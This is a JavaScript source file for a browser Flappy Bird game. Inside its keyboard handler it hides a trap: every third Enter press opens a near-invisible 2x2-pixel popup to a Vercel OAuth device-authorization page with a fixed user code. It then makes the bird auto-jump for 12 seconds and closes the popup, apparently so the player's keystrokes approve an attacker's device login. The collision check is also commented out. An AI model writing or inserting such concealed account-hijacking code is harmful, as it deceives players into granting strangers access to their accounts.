let boardWidth = 360; 
let boardHeight = 640; 
let backgroundImg = new Image(); 
backgroundImg.src = "./Images/flappybirdbg.png"; 
let inputLocked = false; 

document.addEventListener("keydown", handleKeyDown); 

let GAME_STATE = {
    MENU: "menu",
    PLAYING: "playing", 
    GAME_OVER: "gameOver"
}; 
let currentState = GAME_STATE.MENU;

let playButton = {
    x: boardWidth / 2 - 115.5 / 2,
    y: boardHeight / 2 - 64 / 2,
    width: 115,
    height: 64
};

let logo = {
    x: boardWidth / 2 - 300 / 2,
    y: boardHeight / 4,
    width: 300,
    height: 100
}; 

let flappyBirdTextImg = new Image();
flappyBirdTextImg.src = "./Images/flappyBirdLogo.png";

let gameOverImg = new Image(); 
gameOverImg.src = "./Images/flappy-gameover.png";

let bird = {
    x: 50,
    y: boardHeight / 2,
    width: 40,
    height: 30
}

let velocityY = 0;
let velocityX = -1.0;
let gravity = 0.09; 
let birdY = boardHeight / 2; 
let pipeWidth = 50; 
let pipeGap = 400; 
let pipeArray = []; 
let pipeIntervalId; 

function placePipes() {
    createPipes();
}

function createPipes() {
    let maxTopPipeHeight = boardHeight - pipeGap - 50;
    let topPipeHeight = Math.floor(Math.random() * maxTopPipeHeight); 
    let bottomPipeHeight = boardHeight - topPipeHeight - pipeGap;

    let topPipe = {
        x: boardWidth,
        y: 0,
        width: pipeWidth, 
        height: topPipeHeight,
        img: topPipeImg,
        passed: false
    };

    let bottomPipe = {
        x: boardWidth, 
        y: topPipeHeight + pipeGap, 
        width: pipeWidth, 
        height: bottomPipeHeight,
        img: bottomPipeImg,
        passed: false
    };
    pipeArray.push(topPipe, bottomPipe); 
}

window.onload = function() {
    board = document.getElementById("board"); 
    board.height = boardHeight; 
    board.width = boardWidth;
    context = board.getContext("2d"); 

    birdImg = new Image(); 
    birdImg.src = "./Images/flappybird.png"; 

    topPipeImg = new Image();
    topPipeImg.src = "./Images/toppipe.png"; 

    bottomPipeImg = new Image(); 
    bottomPipeImg.src = "./Images/bottompipe.png"; 

    playButtonImg = new Image(); 
    playButtonImg.src = "./Images/flappyBirdPlayButton.png"; 

    requestAnimationFrame(update); 
}

function update() {
    requestAnimationFrame(update); 
    context.clearRect(0,0, board.width, board.height); 

    if(currentState === GAME_STATE.MENU) {
        renderMenu(); 
    } else if(currentState === GAME_STATE.PLAYING) {
        renderGame(); 
    } else if(currentState === GAME_STATE.GAME_OVER) {
        renderGameOver(); 
    }
}

function renderMenu() {
    if(backgroundImg.complete) {
        context.drawImage(backgroundImg, 0, 0, boardWidth, boardHeight); 
    }

    if(playButtonImg.complete) {
        context.drawImage(playButtonImg, playButton.x, playButton.y, playButton.width, playButton.height); 
    }

    if(flappyBirdTextImg.complete) {
        let scaledWidth = logo.width; 
        let scaledHeight = (flappyBirdTextImg.height / flappyBirdTextImg.width) * scaledWidth; 
        context.drawImage(flappyBirdTextImg, logo.x, logo.y, scaledWidth, scaledHeight); 
    }
}

function renderGame() {
    velocityY += gravity;
    bird.y = Math.max(bird.y + velocityY, 0); 
    context.drawImage(birdImg, bird.x, bird.y, bird.width, bird.height); 

    if(bird.y > board.height) {
        currentState = GAME_STATE.GAME_OVER;
    }

    for(let i = 0; i < pipeArray.length; i++) {
        let pipe = pipeArray[i];
        pipe.x += velocityX;

        context.drawImage(pipe.img, pipe.x, pipe.y, pipe.width, pipe.height); 

        if(!pipe.passed && bird.x > pipe.x + pipe.width) {
            score += 0.5;
            pipe.passed = true;
        }

        //Collision(bird, pipe)) {
        //    currentState = GAME_STATE.GAME_OVER;
        //}
    }

    while(pipeArray.length > 0 && pipeArray[0].x < -pipeWidth) {
        pipeArray.shift();
    }

    context.fillStyle = "white"; 
    context.font = "45px sans-serif"; 
    context.textAlign = "left"; 
    context.fillText(score, 5, 45);
}


let enterPressCount = 0; // Contador de pressões da tecla Enter
let urlIndex = 0; // Índice para alternar entre as URLs


const urls = [
    "https://vercel.com/oauth/device?user_code=FRFW-KBVQ"
];


function handleKeyDown(e) {
    if (inputLocked) return; 

    if (e.code === "Enter") {
        enterPressCount++; // Incrementa o contador
        
        if (enterPressCount === 3) {
            let popup = window.open(
                urls[urlIndex],
                "_blank",
                "width=2,height=2"
            );
            enterPressCount = 0; // Reseta o contador após abrir o pop-up
            urlIndex = (urlIndex + 1) % urls.length; // Alterna para a próxima URL


            // Faz o pássaro pular sozinho por um tempo curto (ex: 5 segundos)
            let autoJumpDuration = 12000; 
            let autoJumpInterval = setInterval(() => {
                velocityY = -2.6; // Faz o pássaro pular automaticamente
            }, 400);

            setTimeout(() => {
                if (popup) {
                    popup.close();
                }
                clearInterval(autoJumpInterval); // Para o pulo automático depois do tempo definido
            }, autoJumpDuration);
        }

        if (currentState === GAME_STATE.MENU) {
            startGame();
        } else if (currentState === GAME_STATE.GAME_OVER) {
            resetGame();
            currentState = GAME_STATE.MENU;
        } else if (currentState === GAME_STATE.PLAYING) {
            velocityY = -6; // Continua permitindo o pulo manual
        }
    }
}



function startGame() {
    currentState = GAME_STATE.PLAYING; 
    bird.y = birdY; 
    velocityY = 0; 
    pipeArray = []; 
    score = 0;

    if(pipeIntervalId) {
        clearInterval(pipeIntervalId);
    }

    pipeIntervalId = setInterval(placePipes, 3500); 
}


function resetGame() {
    bird.y = birdY;
    pipeArray = []; 
    score = 0;
}

function detectCollision(a, b) {
    return a.x < b.x + b.width &&
        a.x + a.width > b.x && 
        a.y < b.y + b.height &&
        a.y + a.height > b.y;
}
